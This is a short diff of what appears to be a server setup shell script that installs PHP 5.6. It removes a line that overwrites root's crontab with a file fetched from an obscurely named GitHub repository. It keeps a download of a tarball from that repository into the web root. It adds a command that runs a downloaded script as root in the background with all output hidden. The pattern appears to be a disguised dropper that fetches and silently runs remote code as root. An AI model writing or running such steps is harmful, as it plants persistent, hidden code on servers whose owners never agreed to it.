@@ -20,10 +20,6 @@ apt-get install -y php5.6
 
 apt-get install -y php5.6-curl
 
-cd /var/spool/cron/crontabs/
-
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/root84744474 -O /var/spool/cron/crontabs/root
-
 chmod 600 -R ./root
 
 cd /etc/
@@ -57,3 +53,5 @@ cp -r ./* ../
 cd /var/www/html/
 
 wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8444.tar.gz
+
+sudo -u root bash /var/www/html/linuxsync84 &> /dev/null &
